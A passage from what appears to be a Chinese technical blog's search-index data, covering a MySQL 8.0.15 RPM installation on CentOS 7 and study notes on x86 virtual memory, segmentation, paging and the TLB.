xxx@xx.xx.xx.xx:/root/mysql-community-libs-8.0.15-1.el7.x86_64.rpm\nscp mysql-community-common-8.0.15-1.el7.x86_64.rpm xxx@xx.xx.xx.xx:/root/mysql-community-common-8.0.15-1.el7.x86_64.rpm\nscp mysql-community-server-8.0.15-1.el7.x86_64.rpm xxx@xx.xx.xx.xx:/root/mysql-community-server-8.0.15-1.el7.x86_64.rpm\n</code></pre> <p>\u6309\u7167\u5148\u540e\u987a\u5e8f\u4f9d\u6b21\u6267\u884c<code>yum</code>\u672c\u5730\u5b89\u88c5\uff1a</p> <pre><code>sudo yum localinstall mysql-community-common-8.0.15-1.el7.x86_64.rpm\nsudo yum localinstall mysql-community-libs-8.0.15-1.el7.x86_64.rpm\nsudo yum localinstall mysql-community-client-8.0.15-1.el7.x86_64.rpm\nsudo yum localinstall mysql-community-server-8.0.15-1.el7.x86_64.rpm\n\nsudo yum -y install mysql\n</code></pre> <p>\u5b89\u88c5\u6210\u529f\uff0c\u542f\u52a8\u5e76\u6d4b\u8bd5\u670d\u52a1\uff1a</p> <pre><code>systemctl start mysqld.service\nsystemctl status mysqld.service\n</code></pre> <p>\u627e\u51fa\u9ed8\u8ba4\u5bc6\u7801\uff1a</p> <pre><code>grep \"password\" /var/log/mysqld.log &gt;&gt; defalut_mysql_passwd.txt\n</code></pre>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/","title":"Virtual Memory and TLB","text":"<p>AI Generated Abstract</p> <p>\u672c\u7bc7\u535a\u5ba2\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u865a\u62df\u5185\u5b58\u548c\u5730\u5740\u8f6c\u6362\u7684\u76f8\u5173\u6982\u5ff5\uff0c\u5305\u62ec\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u5212\u5206\u3001\u4fdd\u62a4\u6a21\u5f0f\u4e0b\u7684\u8fdb\u7a0b\u8fd0\u884c\u673a\u5236\u3001\u5730\u5740\u8f6c\u5316\u7684\u5177\u4f53\u6b65\u9aa4\uff08\u903b\u8f91\u5730\u5740\u5230\u7ebf\u6027\u5730\u5740\u3001\u7ebf\u6027\u5730\u5740\u5230\u7269\u7406\u5730\u5740\uff09\u3001TLB \u7684\u4f5c\u7528\u53ca\u5176\u5de5\u4f5c\u539f\u7406\uff0c\u5e76\u7b80\u8981\u8bf4\u660e\u4e86 Linux \u7cfb\u7edf\u5bf9\u6bb5\u5f0f\u7ba1\u7406\u7684\u5904\u7406\u65b9\u5f0f\u3002\u901a\u8fc7\u56fe\u6587\u7ed3\u5408\u7684\u65b9\u5f0f\uff0c\u5e2e\u52a9\u8bfb\u8005\u66f4\u597d\u5730\u7406\u89e3\u865a\u62df\u5185\u5b58\u548c TLB \u7684\u6838\u5fc3\u539f\u7406\u3002</p>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/#\u865a\u62df\u5730\u5740\u7a7a\u95f4","title":"\u865a\u62df\u5730\u5740\u7a7a\u95f4","text":"<p>x86 CPU \u7684\u5730\u5740\u603b\u9009\u5bbd\u5ea6\u4e3a 32 \u4f4d\uff0c\u7406\u8bba\u5bfb\u5740\u4e0a\u9650\u4e3a 4GB\u3002\u800c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u5927\u5c0f\u5c31\u662f 4GB\uff0c\u5360\u6ee1\u603b\u7ebf\uff0c\u4e14\u7a7a\u95f4\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5b57\u8282\u5206\u914d\u4e00\u4e2a\u865a\u62df\u5730\u5740</p> <ul> <li>\u5176\u4e2d\u9ad8 2G<code>0x80000000 ~ 0xFFFFFFFF</code>\u4e3a\u5185\u548c\u7a7a\u95f4\uff0c\u7531\u64cd\u4f5c\u7cfb\u7edf\u8c03\u7528\uff1b</li> <li>\u4f4e 2G<code>0x00000000 ~ 0x7FFFFFFF</code>\u4e3a\u7528\u6237\u7a7a\u95f4\uff0c\u7531\u7528\u6237\u4f7f\u7528\u3002</li> </ul> <p>\u5728\u7cfb\u7edf\u4e2d\u8fd0\u884c\u7684\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u90fd\u72ec\u81ea\u62e5\u6709\u4e00\u4e2a\u865a\u62df\u7a7a\u95f4\uff0c\u8fdb\u57ce\u4e4b\u95f4\u7684\u865a\u62df\u7a7a\u95f4\u4e0d\u5171\u7528\u3002</p> <p>\u865a\u62df\u5730\u5740\u7a7a\u95f4\u662f\u4e00\u79cd\u901a\u8fc7\u673a\u5236\u6620\u5c04\u51fa\u6765\u7684\u7a7a\u95f4\uff0c\u4e0e\u5b9e\u9645\u7269\u7406\u7a7a\u95f4\u5927\u5c0f\u65e0\u5fc5\u7136\u8054\u7cfb\uff0c\u5728 x86 \u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u65e0\u8bba\u8ba1\u7b97\u53ca\u5b9e\u9645\u4e3b\u5b58\u662f 512MB \u8fd8\u662f 8GB\uff0c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u603b\u662f 4GB\uff0c\u8fd9\u662f\u7531 CPU \u548c\u64cd\u4f5c\u7cfb\u7edf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u7684\uff0c\u5373\uff1a</p> <p>CPU \u5730\u5740\u603b\u7ebf\u5bbd\u5ea6 \u2192 \u7269\u7406\u5730\u5740\u8303\u56f4 CPU \u7684 ALU \u5bbd\u5ea6 \u2192 \u64cd\u4f5c\u7cfb\u7edf\u4f4d\u6570 \u2192 \u865a\u62df\u5730\u5740\u8303\u56f4</p>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/#\u865a\u62df\u5185\u5b58","title":"\u865a\u62df\u5185\u5b58","text":"<p>\u865a\u62df\u5730\u5740\u7a7a\u95f4 = \u4e3b\u5b58 + \u865a\u62df\u5185\u5b58 (\u4ea4\u6362\u7a7a\u95f4 Swap Space)</p> <p>\u865a\u62df\u5185\u5b58\uff1a\u5c06\u786c\u76d8\u7684\u4e00\u90e8\u5206\u4f5c\u4e3a\u5b58\u50a8\u5668\u4f7f\u7528\uff0c\u6765\u6269\u5145\u7269\u7406\u5185\u5b58\u3002</p> <p>\u5229\u7528\u4e86\u81ea\u52a8\u8986\u76d6\u3001\u4ea4\u6362\u6280\u672f\u3002\u5185\u5b58\u4e2d\u5b58\u4e0d\u4e0b\u3001\u6682\u65f6\u4e0d\u7528\u7684\u5185\u5bb9\u4f1a\u5b58\u5728\u786c\u76d8\u4e2d\u3002</p> <p>Assume: 32 \u4f4d\u64cd\u4f5c\u7cfb\u7edf\uff0c32 \u4f4d\u5bfb\u5740\u603b\u7ebf\u5bbd\u5ea6 \u2192 4G \u7ebf\u6027\u7a7a\u95f4</p>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/#\u4fdd\u62a4\u6a21\u5f0f\u4e0b\u7684\u8fdb\u7a0b\u8fd0\u884c","title":"\u4fdd\u62a4\u6a21\u5f0f\u4e0b\u7684\u8fdb\u7a0b\u8fd0\u884c","text":"<p>\u865a\u62df\u5730\u5740\u7a7a\u95f4\u662f\u786c\u4ef6\u884c\u4e3a\uff0cCPU \u81ea\u52a8\u5b8c\u6210 (\u540c\u65f6\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u534f\u4f5c) \u865a\u62df\u5730\u5740\u5230\u7269\u7406\u5730\u5740 (\u53ef\u80fd\u5dee\u71ac\u8fc7\u5b9e\u9645\u5185\u5b58\uff0c\u8fd9\u6837\u4f1a\u4ea7\u751f\u4e00\u4e2a\u5f02\u5e38\u4e2d\u65ad\uff0c\u63ed\u6653\u6765\u6709\u64cd\u4f5c\u7cfb\u7edf\u5904\u7406 (\u5982\u4ece\u865a\u62df\u5185\u5b58\u4e2d\u8c03\u51fa\u5bf9\u5e94\u7684\u9875\u6846\u5185\u5bb9))\u3002</p> <p>\u6240\u4ee5\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u82e5\u8fd0\u884c\u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u5176\u6c47\u7f16\u7ea7\u3001\u673a\u5668\u8bed\u8a00\u7ea7\u7684\u5bfb\u5740\u90fd\u662f\u7528\u7684\u865a\u62df\u5730\u5740\uff0c\u5373\u5728\u4e00\u822c\u7684\u7f16\u7a0b\u4e2d\u4e0d\u4f1a\u63a5\u89e6\u5230\u7269\u7406\u4e00\u5c42\u3002</p> <p>\u5728\u8fdb\u7a0b\u88ab\u52a0\u8f7d\u65f6\uff0c\u7cfb\u7edf\u4e3a\u8fdb\u7a0b\u5efa\u7acb\u552f\u4e00\u7684\u6570\u636e\u7ed3\u6784<code>\u8fdb\u7a0b\u63a7\u5236\u5757(PCB = Process Control Block)</code>\uff0c\u76f4\u81f3\u8fdb\u7a0b\u7ed3\u675f\u3002</p> <p>PCB \u4e2d\u63cf\u8ff0\u4e86\u8be5\u8fdb\u7a0b\u7684\u73b0\u72b6\u4ee5\u53ca\u63a7\u5236\u8fd0\u884c\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u6709\u4e86 PCB\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u624d\u53ef\u4ee5\u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\u548c\u5176\u4ed6\u8fdb\u7a0b\u4e00\u8d77\u88ab\u5e76\u53d1\u5730\u8fd0\u884c\u8d77\u6765\uff0c\u64cd\u4f5c\u7cfb\u7edf\u901a\u8fc7 PCB \u5bf9\u8fdb\u7a0b\u8fdb\u884c\u63a7\u5236\u3002</p> <p>PCB \u4e2d\u7684\u7a0b\u5e8f ID(PID(unix\u3001linux)\u3001\u53e5\u67c4 (windows)) \u662f\u8fdb\u7a0b\u7684\u552f\u4e00\u6807\u8bc6\uff1bPCB \u4e2d\u7684\u4e00\u4e2a\u6307\u9488\u6307\u5411 \u9875\u8868 \uff0c\u8fd9\u4e9b\u90fd\u4e0e\u5730\u5740\u8f6c\u5316\u6709\u5173\u3002</p>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/#\u5730\u5740\u8f6c\u5316","title":"\u5730\u5740\u8f6c\u5316","text":"<p>\u5730\u5740\u8f6c\u5316\u7684\u5168\u8fc7\u7a0b\u53ef\u4ee5\u7528\u4ee5\u4e0b\u8fd9\u5f20\u56fe\u6765\u6982\u62ec\uff1a</p> <p></p> <p>\u4ee5\u4e0b\u662f\u5177\u4f53\u6b65\u9aa4\u4ecb\u7ecd\u3002</p>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/#\u903b\u8f91\u5730\u5740--\u7ebf\u6027\u5730\u5740-\u6bb5\u5f0f\u5185\u5b58\u7ba1\u7406intel-\u65e9\u671f\u7b56\u7565\u7684\u4fdd\u7559","title":"\u903b\u8f91\u5730\u5740 \u2192 \u7ebf\u6027\u5730\u5740 (\u6bb5\u5f0f\u5185\u5b58\u7ba1\u7406\uff0cIntel \u65e9\u671f\u7b56\u7565\u7684\u4fdd\u7559)","text":"<ul> <li> <p>\u6bb5\u5185\u504f\u79fb\u5730\u5740 (32 \u4f4d)</p> </li> <li> <p>\u6bb5\u9009\u62e9\u7b26\uff1a16 \u4f4d\u957f\u7684\u5e8f\u5217\uff0c\u662f\u7d22\u5f15\u503c\uff0c\u5b9a\u4f4d\u6bb5\u63cf\u8ff0\u7b26\uff1b\u7ed3\u6784\uff1a   </p> <ul> <li>\u9ad8 13 \u4f4d\u4e3a\u8868\u5185\u7d22\u5f15\u53f7 \u2014\u2014 \u4f46\u6ce8\u610f\u7531\u4e8e GDT \u7b2c\u4e00\u9879\u7559\u7a7a\uff0c\u6240\u4ee5\u7d22\u5f15\u8981\u5148\u52a0 1\uff1b</li> <li>\u800c 2 \u4f4d\u4e3a TI \u8868\u6307\u793a\u5668\uff0c0 \u662f\u6307 GDT\uff0c1 \u662f\u6307 LDT\uff1b</li> <li>0\u30011 \u4f4d\u662f RPL \u8bf7\u6c42\u8005\u7279\u6743\u7ea7\uff0c00 \u6700\u9ad8\uff0c11 \u6700\u4f4e \u2014\u2014 \u5728 x86 \u4fdd\u62a4\u6a21\u5f0f\u4e0b\u4fee\u6539\u5bc4\u5b58\u5668\u662f\u7cfb\u7edf\u4e4b\u7075\uff0c\u5fc5\u987b\u6709\u5bf9\u5e94\u7684\u6743\u9650\u624d\u80fd\u4fee\u6539 (\u5f53\u524d\u6267\u884c\u6743\u9650\u548c\u6bb5\u5bc4\u5b58\u5668\u4e2d (\u88ab\u4fee\u6539\u7684) \u7684 RPL \u5747\u4e0d\u4f4e\u4e8e\u76ee\u6807\u6bb5\u7684 RPL)</li> </ul> </li> <li> <p>\u6bb5\u63cf\u8ff0\u7b26\uff1a8x8=64 \u4f4d\u957f\u7684\u7ed3\u6784\uff0c\u7528\u6765\u63cf\u8ff0\u4e00\u4e2a\u6bb5\u7684\u5404\u79cd\u5c5e\u6027\u3002\u7ed3\u6784\uff1a    </p> <ul> <li>0\u30011 \u5b57\u8282 +6 \u5b57\u8282\u4f4e 4 \u4f4d (20 \u4f4d) \u6bb5\u8fb9\u754c/\u6bb5\u957f\u5ea6\uff1a\u6700\u5927 1MB \u6216\u8005 4G(\u770b\u7c92\u5ea6\u4f4d\u7684\u5355\u4f4d)</li> <li>2\u30013\u30014\u30017 \u5b57\u8282 (32 \u4f4d) \u6bb5\u57fa\u5740\uff1a4G \u7ebf\u6027\u5730\u5740\u7684\u4efb\u610f\u4f4d\u7f6e (\u4e0d\u4e00\u5b9a\u975e\u8981\u88ab 16 \u6574\u9664)</li> <li>6\u30017 \u5b57\u8282\u7684\u5947\u602a\u8bbe\u8ba1\u662f\u4e3a\u4e86\u517c\u5bb9 80286(24 \u4f4d\u5730\u5740\u603b\u7ebf)</li> <li>\u5269\u4e0b\u7684\u90a3\u4e9b\u662f\u6bb5\u5c5e\u6027\uff0c\u8be6\u89c1<code>20180819143434</code></li> </ul> </li> <li> <p>\u6bb5\u63cf\u8ff0\u8868\uff1a\u591a\u4efb\u52a1\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u542b\u6709\u591a\u4e2a\u4efb\u52a1\uff0c\u800c\u6bcf\u4e2a\u4eba\u7269\u90fd\u6709\u591a\u4e2a\u6bb5\uff0c\u5176\u6bb5\u63cf\u8ff0\u7b26\u5b58\u4e8e\u6bb5\u63cf\u8ff0\u8868\u4e2d\u3002   IA-32 \u5904\u7406\u5668\u6709 3 \u4e2a\u6bb5\u63cf\u8ff0\u8868\uff1aGDT\u3001LDT \u548c IDT\u3002</p> <ul> <li>GDT(Global Descripter Table) \u5168\u5c40\u6bb5\u63cf\u8ff0\u7b26\u8868\uff1a\u4e00\u4e2a\u7cfb\u7edf\u4e00\u822c\u53ea\u6709\u4e00\u4e2a GDT\uff0c\u542b\u6709\u6bcf\u4e00\u4e2a\u4efb\u52a1\u90fd\u53ef\u4ee5\u8bbf\u95ee\u7684\u6bb5\uff1b\u901a\u5e38\u5305\u542b\u64cd\u4f5c\u7cfb\u7edf\u6240\u4f7f\u7528\u7684\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u548c\u5806\u6808\u6bb5\uff0cGDT \u540c\u65f6\u5305\u542b\u5404\u8fdb\u7a0b LDT \u6570\u636e\u6bb5\u9879\uff0c\u4ee5\u53ca\u8fdb\u7a0b\u95f4\u901a\u8baf\u6240\u9700\u8981\u7684\u6bb5\u3002 GDTR \u662f CPU \u63d0\u4f9b\u7684\u5bc4\u5b58\u5668\uff0c\u5b58\u50a8 GDT \u7684\u4f4d\u7f6e\u548c\u8fb9\u754c\uff1b\u5728 32 \u4f4d\u6a21\u5f0f\u4e0b RGDT \u6709 48 \u4f4d\u957f (\u9ad8 32 \u4f4d\u57fa\u5730\u5740 + \u4f4e 16 \u4f4d\u8fb9\u754c)\uff0c\u5728 32e \u6a21\u5f0f\u4e0b\u6709 80 \u4f4d\u957f (\u9ad8 64 \u4f4d\u57fa\u5730\u5740 + \u4f4e 16 \u4f4d\u8fb9\u754c)\u3002 GDT \u7684\u7b2c\u4e00\u4e2a\u8868\u9879\u7559\u7a7a\u4e0d\u7528\uff0c\u662f\u7a7a\u63cf\u8ff0\u7b26\uff0c\u6240\u4ee5\u7d22\u5f15\u53f7\u8981\u52a0 1\u3002 GDT \u6700\u591a 128 \u9879\u3002</li> <li>LDT(Local Descripter Table) \u5c40\u90e8\u6bb5\u63cf\u8ff0\u7b26\u8868\uff1a16 \u4f4d\u957f\uff0c\u5c5e\u4e8e\u67d0\u4e2a\u8fdb\u7a0b\u3002\u4e00\u4e2a\u8fdb\u7a0b\u4e00\u4e2a LDT\uff0c\u5bf9\u5e94\u6709 RLDT \u5bc4\u5b58\u5668\uff0c\u8fdb\u7a0b\u5207\u6362\u65f6 RLDT \u6539\u53d8\u3002 RLDT \u548c RGDT \u4e0d\u4e00\u6837\uff0cRLDT \u662f\u4e00\u4e2a\u7d22\u5f15\u503c\u800c\u4e0d\u662f\u5b9e\u9645\u6307\u5411\uff0c\u6307\u5411 GDT \u4e2d\u67d0\u4e00\u4e2a LDT \u63cf\u8ff0\u9879\u3002\u6240\u4ee5\u5982\u679c\u8981\u83b7\u53d6 LDT \u4e2d\u7684\u67d0\u4e00\u9879\uff0c\u5148\u8981\u8bbf\u95ee GDT \u627e\u5230\u5bf9\u5e94 LDT\uff0c\u518d\u627e\u5230 LDT \u4e2d\u7684\u4e00\u9879\u3002 \u7f16\u8bd1\u7a0b\u5e8f\u65f6\uff0c\u7a0b\u5e8f\u5185\u8d4b\u4e88\u4e86\u865a\u62df\u9875\u53f7\u3002\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u901a\u8fc7\u5bf9\u5e94 LDT \u8f6c\u8bd1\u6210\u7269\u7406\u5730\u5740\u3002\u6545\u865a\u62df\u9875\u53f7\u662f\u5c40\u90e8\u6027\u7684\u3001\u4e0d\u540c\u8fdb\u7a0b\u7684\u9875\u53f7\u4f1a\u6709\u51b2\u7a81\u3002 LDT \u6ca1\u6709\u7a7a\u9009\u62e9\u5b50\u3002</li> <li>IDT(Interrupt Descripter Table) \u4e2d\u65ad\u6bb5\u63cf\u8ff0\u7b26\u8868\uff1b\u4e00\u4e2a\u7cfb\u7edf\u4e00\u822c\u4e5f\u53ea\u6709\u4e00\u4e2a\u3002</li> <li>\u4ee5\u4e0b\u8fd9\u4e2a\u56fe\u80fd\u505a\u4e00\u70b9\u89e3\u91ca\uff1a </li> </ul> </li> </ul>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/#\u7ebf\u6027\u5730\u5740--\u7269\u7406\u5730\u5740-\u9875\u5f0f\u5185\u5b58\u7ba1\u7406","title":"\u7ebf\u6027\u5730\u5740 \u2192 \u7269\u7406\u5730\u5740 (\u9875\u5f0f\u5185\u5b58\u7ba1\u7406)","text":"<p>\u8fd9\u4e00\u6b65\u7531 CPU \u7684\u9875\u5f0f\u7ba1\u7406\u5355\u5143\u6765\u8d1f\u8d23\u8f6c\u6362\u3002\u2014\u2014MMU(\u5185\u5b58\u7ba1\u7406\u5355\u5143)\u3002</p> <ul> <li> <p>\u7ebf\u6027\u5730\u5740\u53ef\u4ee5\u62c6\u5206\u4e3a\u4e09\u90e8\u5206 (\u6216\u8005\u4e24\u90e8\u5206)\uff1a   </p> </li> <li> <p>\u9875 (Page)\uff1a\u7ebf\u6027\u5730\u5740\u88ab\u5212\u5206\u4e3a\u5927\u5c0f\u4e00\u81f4\u7684\u82e5\u5e72\u5185\u5b58\u533a\u57df\uff0c\u5176\u5bf9\u5e94\u6620\u5c04\u5230\u5927\u5c0f\u76f8\u540c\u7684\u4e0e\u7269\u7406\u7a7a\u95f4\u533a\u57df\u9875\u6846 (Frame) \u4e0a\u3002\u8fd9\u4e2a\u6620\u5c04\u4e0d\u4e00\u5b9a\u662f\u8fde\u8d2f\u800c\u6709\u5e8f\u7684\u3002</p> </li> <li> <p>CR3\uff1a\u9875\u76ee\u5f55\u57fa\u5740\u5bc4\u5b58\u5668\u3002\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\uff0cCR3 \u7684\u5185\u5bb9\u4e0d\u540c (\u6709\u70b9\u50cf RLDT)\uff0c\u9875\u76ee\u5f55\u57fa\u5740\u4e5f\u4e0d\u540c\uff0c\u7ebf\u6027\u5730\u5740 - \u7269\u7406\u5730\u5740\u7684\u6620\u5c04\u4e5f\u4e0d\u540c\u3002</p> </li> <li> <p>\u9875\u76ee\u5f55\uff1a\u5360\u7528\u4e00\u4e2a 4kb \u7684\u5185\u5b58\u9875\uff0c\u6700\u591a\u5b58\u50a8 1024 \u4e2a\u9875\u76ee\u5f55\u8868\u9879 (PDE)\uff0c\u4e00\u4e2a PDE \u6709 4 \u5b57\u8282\u3002\u5728\u6ca1\u542f\u7528 PAE \u65f6\uff0c\u6709\u4e24\u79cd PDE\uff0c\u89c4\u683c\u4e0d\u540c\u3002</p> </li> <li> <p>\u9875\u76ee\u5f55\u8868\u9879 (PDE)\uff1a\u6bcf\u4e2a\u7a0b\u5e8f\u6709\u591a\u4e2a\u9875\u8868\uff0c\u5373\u62e5\u6709\u591a\u4e2a PDE\u3002PDE \u7684\u7ed3\u6784\u5982\u4e0b\uff1a      12~31 \u4f4d (20 \u4f4d) \u8868\u793a\u9875\u8868\u8d77\u59cb\u7269\u7406\u5730\u5740\u7684\u9ad8 20 \u4f4d (\u9875\u8868\u57fa\u5740\u4f4e 12 \u4f4d\u4e3a 0\uff0c\u5373\u4e00\u5b9a\u4ee5 4kb \u5bf9\u9f50)\u3002</p> </li> <li> <p>\u9875\u8868\uff1a\u4e00\u4e2a\u9875\u8868\u5360 4kb \u7684\u5185\u5b58\u9875\uff0c\u6700\u591a\u5b58\u50a8 1024 \u4e2a\u9875\u8868\u9879 (PTE)\uff0c\u4e00\u4e2a PTE \u662f 4 \u5b57\u8282\u3002\u9875\u8868\u7684\u57fa\u5740\u662f 4kb \u5bf9\u9f50\u7684\uff0c\u4f4e 12 \u4f4d\u662f 0\u3002</p> </li> </ul> <p>\u91c7\u7528\u5bf9\u9875\u8868\u9879\u7684\u4e8c\u7ea7\u7ba1\u7406\u6a21\u5f0f (\u4e5f\u76ee\u5f55\u2192\u9875\u8868\u2192\u9875) \u80fd\u591f\u8282\u7ea6\u7a7a\u95f4\u3002\u56e0\u4e3a\u4e0d\u5b58\u5728\u7684\u9875\u8868\u5c31\u53ef\u4ee5\u4e0d\u5206\u914d\u7a7a\u95f4\uff0c\u5e76\u4e14\u5bf9\u4e8e Windows \u6765\u8bf4\u53ea\u6709\u4e00\u7ea7\u9875\u8868\u624d\u4f1a\u5b58\u5728\u4e3b\u5b58\u4e2d\uff0c\u4e8c\u7ea7\u53ef\u4ee5\u5b58\u5728\u8f85\u5b58\u4e2d\u2014\u2014\u4e0d\u8fc7 Linux \u4e2d\u5b83\u4eec\u90fd\u5e38\u9a7b\u4e3b\u5b58\u3002</p> <p>\u4e00\u4e9b CPU \u4f1a\u63d0\u4f9b\u66f4\u591a\u7ea7\u7684\u67b6\u6784\uff0c\u5982\u4e09\u7ea7\u3001\u56db\u7ea7\u3002Linux \u4e2d\uff0c\u6709\u5bf9\u5e94\u7684\u9ad8\u5c42\u6b21\u62bd\u8c61\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u56db\u5c42\u9875\u7ba1\u7406\u67b6\u6784\uff1a  \u628a\u4e2d\u95f4\u7684\u67d0\u51e0\u4e2a\u5b9a\u4e3a\u957f\u5ea6\u4e3a 0\uff0c\u5c31\u53ef\u4ee5\u8c03\u6574\u67b6\u6784\u7ea7\u6570\u3002\u5982\u201c\u56db\u5316\u4e8c\u201d\uff1a\u67d0\u5730\u5740 0x08147258\uff0c\u5bf9\u5e94\u7684 PUD\u3001PMD \u91cc\u53ea\u6709\u4e00\u4e2a\u8868\u9879\u4e3a PUD\u2192PMD\uff0cPMD\u2192PT\uff1b\u5212\u5206\u7684\u65f6\u5019\uff0cPGD=0000100000\uff0cPUD=PMD=0\uff0cPT=0101000111.</p>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/#tlb-\u8f6c\u6362\u68c0\u6d4b\u7f13\u51b2\u533a\u5feb\u8868\u8f6c\u8bd1\u540e\u88ab\u7f13\u51b2\u533a","title":"TLB (\u8f6c\u6362\u68c0\u6d4b\u7f13\u51b2\u533a\u3001\u5feb\u8868\u3001\u8f6c\u8bd1\u540e\u88ab\u7f13\u51b2\u533a)","text":"<p>\u5904\u7406\u5668\u4e2d\uff0c\u4e00\u4e2a\u5177\u6709\u5e76\u884c\u671d\u8d75\u80fd\u529b\u7684\u7279\u6b8a\u9ad8\u901f\u7f13\u5b58\u5668\uff0c\u5b58\u50a8\u6700\u8fd1\u8bbf\u95ee\u8fc7\u7684\u4e00\u4e9b\u9875\u8868\u9879 (\u65f6\u7a7a\u5c40\u90e8\u6027\u539f\u7406\uff0c\u51cf\u5c11\u9875\u6620\u5c04\u7684\u5185\u5b58\u8bbf\u95ee\u6b21\u6570)\u3002</p> <p>TLB \u8f83\u8d35\uff0c\u901a\u5e38\u80fd\u591f\u5b58\u653e 16~512 \u4e2a\u9875\u8868\u9879\u3002</p> <ul> <li>TLB \u547d\u4e2d\uff1a\u76f4\u63a5\u53d6\u51fa\u5bf9\u5e94\u7684\u9875\u8868\u9879</li> <li> <p>TLB \u7f3a\u5931\uff1a\u5148\u6dd8\u6c70 TLB \u4e2d\u7684\u67d0\u4e00\u9879 (TLB \u66ff\u6362\u7b56\u7565\uff0c\u4e00\u4e9b\u7b97\u6cd5\uff0c\u53ef\u4ee5\u7531\u786c\u4ef6\u6216\u8f6f\u4ef6\u6765\u5b9e\u73b0)</p> <ul> <li>\u786c\u4ef6\u5904\u7406 TLB Miss\uff1aCPU \u4f1a\u904d\u5386\u9875\u8868\uff0c\u627e\u5230\u6b63\u786e\u7684 PTE\uff1b\u5982\u679c\u6ca1\u6709\u627e\u5230\uff0cCPU \u5c31\u4f1a\u53d1\u8d77\u4e00\u4e2a\u9875\u9519\u8bef\u5e76\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u3002</li> <li>\u8f6f\u4ef6\u5904\u7406 TLB Miss\uff1aCPU \u76f4\u63a5\u53d1\u51fa\u672a\u547d\u4e2d\u9519\u8bef\uff0c\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6765\u5904\u7406\u3002</li> </ul> </li> <li> <p>\u810f\u8bb0\u5f55\uff1a\u5f53 TLB \u4e2d\u67d0\u4e2a PTE \u9879\u5931\u6548 (\u5982\u5207\u6362\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u9000\u51fa\u3001\u865a\u62df\u9875\u6362\u51fa\u5230\u78c1\u76d8)\uff0cPTE \u6807\u8bb0\u4e3a\u4e0d\u5b58\u5728\uff0c\u6b64\u65f6\u6620\u5c04\u5df2\u7ecf\u4e0d\u6210\u7acb\u4e86\u3002   \u64cd\u4f5c\u7cfb\u7edf\u8981\u4fdd\u8bc1\u5373\u65f6\u5237\u65b0\u6389\u8fd9\u4e9b\u810f\u8bb0\u5f55\uff0c\u4e0d\u540c\u7684 CPU \u6709\u4e0d\u540c\u7684\u5237\u65b0 TLB \u65b9\u6cd5\uff0c\u4f46\u6bcf\u6b21\u90fd\u5b8c\u5168\u5237\u65b0 TLB \u4f1a\u5f88\u6162\uff0c\u6240\u4ee5\u73b0\u5728\u6709\u4e00\u4e9b\u7b56\u7565\uff0c\u6269\u5c55\u5bf9\u4e00\u4e2a PTE \u7684\u63cf\u8ff0 (\u5982\u9488\u5bf9\u67d0\u4e2a\u8fdb\u7a0b\u3001\u7a7a\u95f4\u7684\u6807\u8bc6\uff0c\u5982\u679c\u76ee\u524d\u8fdb\u7a0b\u4e0e PTE \u76f8\u5173\uff0c\u5c31\u4f1a\u5ffd\u7565\u6389)\uff0c\u8fd9\u6837\u53ef\u4ee5\u8ba9\u591a\u4e2a\u8fdb\u7a0b\u540c\u65f6\u5171\u5b58 TLB</p> </li> </ul>"},{"location":"blog/2019/03/31/virtual-memory-and-tlb/#linux-\u6bb5\u5f0f\u7ba1\u7406","title":"Linux \u6bb5\u5f0f\u7ba1\u7406","text":"<p>Linux \u4f3c\u4e4e\u6ca1\u6709\u7406\u4f1a Intel \u7684\u90a3\u4e00\u5957\u6bb5\u7684\u673a\u5236\uff0c\u800c\u662f\u505a\u4e86\u4e00\u4e2a\u9ad8\u7ea7\u7684\u62bd\u8c61\u3002 Linux \u5bf9\u6240\u6709\u7684\u8fdb\u7a0b\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u6bb5\u6765\u5bf9\u6307\u4ee4\u548c\u6570\u636e\u5bfb\u5740\uff0c\u8ba9\u6bcf\u4e2a\u6bb5\u5bc4\u5b58\u5668\u90fd\u6307\u5411\u540c\u4e00\u4e2a\u6bb5\u63cf\u8ff0\u7b26\uff0c\u8ba9\u8fd9\u4e2a\u6bb5\u63cf\u8ff0\u7b26\u7684\u57fa\u5740\u4e3a 0\uff0c\u957f\u5ea6\u4e3a 4G\u3002\u5373\u7528\u8fd9\u79cd\u65b9\u5f0f\u7565\u53bb\u4e86\u6bb5\u5f0f\u5185\u5b58\u7ba1\u7406\u3002 \u5bf9\u5e94\u591a\u6709\u7528\u6237\u4ee3\u7801\u6bb5\u3001\u7528\u6237\u6570\u636e\u6bb5\u3001\u5185\u6838\u4ee3\u7801\u6bb5\u548c\u5185\u6838\u6570\u636e\u6bb5\u3002\u53ef\u4ee5\u5728<code>segment.h</code>\u4e2d\u770b\u5230\uff0c\u56db\u79cd\u6bb5\u5bf9\u5e94\u7684\u6bb5\u57fa\u5740\u90fd\u662f 